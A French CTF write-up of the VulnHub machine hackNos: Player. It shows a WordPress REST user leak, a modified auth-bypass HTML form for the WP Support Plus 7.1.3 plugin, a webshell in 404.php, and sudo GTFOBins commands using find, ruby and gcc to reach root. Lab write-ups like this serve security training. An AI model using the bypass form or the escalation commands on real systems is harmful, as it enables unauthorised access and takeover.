---
title: "Solution du CTF hackNos: Player de VulnHub"
tags: [CTF,VulnHub]
---

[hackNos: Player](https://vulnhub.com/entry/hacknos-player-v11,459/) annonçait de l'énumération à faire. En fait il fallait surtout être attentif. Pour le reste on a affaire à une succession de GTFObins.

## Hidden in plain sight

Le serveur expose un MariaDB ainsi qu'un serveur Apache qui livre sa page par défaut.

```
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
```

Après beaucoup d'énumération qui n'a mené nulle part, j'ai regardé au code source de la page HTML de l'Apache et j'ai remarqué des particularités que j'aurais tout aussi bien pû voir directement :

```html
        <div class="content_section_text">
            <p>
                By default, Debian does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href="https://www.hacknos.com" rel="follow">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Debian document root is <tt>/var/www/html/g@web</tt>. You
                can make your own virtual hosts under /var/www/mini@web. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>
```

Outre les liens qui ont été modifiés on voir certains mots avec une arobase qui n'ont rien d'officiel.

Je me rends alors sur le path `/g@web/` et je découvre un Wordpress.

En regardant le code HTML je vois qu'un plugin est présent :

```html
<script src='http://192.168.56.221/g@web/wp-content/plugins/wp-support-plus-responsive-ticket-system/asset/js/bootstrap/js/bootstrap.min.js?version=7.1.3&#038;ver=5.3.2'></script>
```

Cette version est vulnérable et il existe deux exploits. Le premier pour une faille SQL :

[WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection - PHP webapps Exploit](https://www.exploit-db.com/exploits/40939)

L'autre est marqué comme une escalade de privilèges, mais en lisant la description, il s'agit en réalité d'un bypass d'authentification.

[WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation - PHP webapps Exploit](https://www.exploit-db.com/exploits/41006)

Pour parvenir à nos fins, il nous faut un nom d'utilisateur. Je pourrais lancer `wpscan` mais je sais qu'il existe une URL REST qui peut révéler les utilisateurs et que `Nuclei` détecte :

```
[CVE-2017-5487:usernames] [http] [medium] http://192.168.56.221/g@web/?rest_route=/wp/v2/users/ [wp-local]
```

Bonne surprise, car on trouve en plus ce qui semble être un mot de passe !

```console
$ curl -s http://192.168.56.221/g@web/?rest_route=/wp/v2/users/ | python3 -m json.tool
[
    {
        "id": 1,
        "name": "wp-local",
        "url": "https://www.hacknos.com",
        "description": "you can upgrade you shell using hackNos@9012!!",
        "link": "http://192.168.56.221/g@web/index.php/author/wp-local/",
        "slug": "wp-local",
        "avatar_urls": {
            "24": "http://2.gravatar.com/avatar/e57bc7a4648b27195f1d73af69da30da?s=24&d=mm&r=g",
            "48": "http://2.gravatar.com/avatar/e57bc7a4648b27195f1d73af69da30da?s=48&d=mm&r=g",
            "96": "http://2.gravatar.com/avatar/e57bc7a4648b27195f1d73af69da30da?s=96&d=mm&r=g"
        },
        "meta": [],
        "_links": {
            "self": [
                {
                    "href": "http://192.168.56.221/g@web/index.php/wp-json/wp/v2/users/1"
                }
            ],
            "collection": [
                {
                    "href": "http://192.168.56.221/g@web/index.php/wp-json/wp/v2/users"
                }
            ]
        }
    }
]
```

Je récupère le PoC pour le bypass et je le modifie :

```html
<form method="post" action="http://192.168.56.221/g@web/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="wp-local">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

J'ouvre la page HTML dans mon navigateur, je soumets le formulaire, puis je me rend sur `/wp-admin`, je suis connecté !

## Get the fuck ouuuuuuuut!

La suite est très classique : éditeur de thème, modification du `404.php` pour disposer d'un webshell, récupération de `reverse-ssh` via `wget`, exécution et on a plus qu'à mettre notre brosse à dent dans la salle de bain.

Je relève la présence de trois utilisateurs :

```
hunter:x:1000:1000:hunter,,,:/home/hunter:/bin/bash
security:x:1001:1001:Security,,,,Audit:/home/security:/bin/bash
hackNos-boat:x:1002:1002:crawler,,,,web directory crawler:/home/hackNos-boat:/bin/bash
```

Le mot de passe `hackNos@9012!!` récupéré précédemment est accepté pour le compte `security`.

```
security@hacknos:~$ sudo -l
Matching Defaults entries for security on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User security may run the following commands on hacknos:
    (hacknos-boat) NOPASSWD: /usr/bin/find
```

L'utilisateur peut exécuter `find` avec le compte `hackNos-boat`. L'option `-exec` nous tend les bras.

```console
security@hacknos:~$ sudo -u hackNos-boat /usr/bin/find /dev/ -name null -exec bash \;
hackNos-boat@hacknos:/home/security$ id
uid=1002(hackNos-boat) gid=1002(hackNos-boat) groups=1002(hackNos-boat)
hackNos-boat@hacknos:/home/security$ sudo -l
Matching Defaults entries for hackNos-boat on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hackNos-boat may run the following commands on hacknos:
    (hunter) NOPASSWD: /usr/bin/ruby
```

Cette fois il faut utiliser `ruby`. On trouve facilement tous les GTFObins sur [le site du même nom](https://gtfobins.github.io/).

```console
hackNos-boat@hacknos:/home/security$ sudo -u hunter /usr/bin/ruby -e 'exec "/bin/bash"'
hunter@hacknos:/home/security$ sudo -l
Matching Defaults entries for hunter on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hunter may run the following commands on hacknos:
    (ALL) NOPASSWD: /usr/bin/gcc
```

Et finalement pour `gcc` :

```console
hunter@hacknos:/home/security$ sudo /usr/bin/gcc -wrapper /bin/sh,-s .
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
    __                     __      _   __               
   / /_   ____ _  _____   / /__   / | / /  ____    _____
  / __ \ / __ `/ / ___/  / //_/  /  |/ /  / __ \  / ___/
 / / / // /_/ / / /__   / ,<    / /|  /  / /_/ / (__  ) 
/_/ /_/ \__,_/  \___/  /_/|_|  /_/ |_/   \____/ /____/  
                                                        

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Website: www.hackNos.com

Linkedin: rahulgehlaut

Tweet me: rahul_gehlaut
```
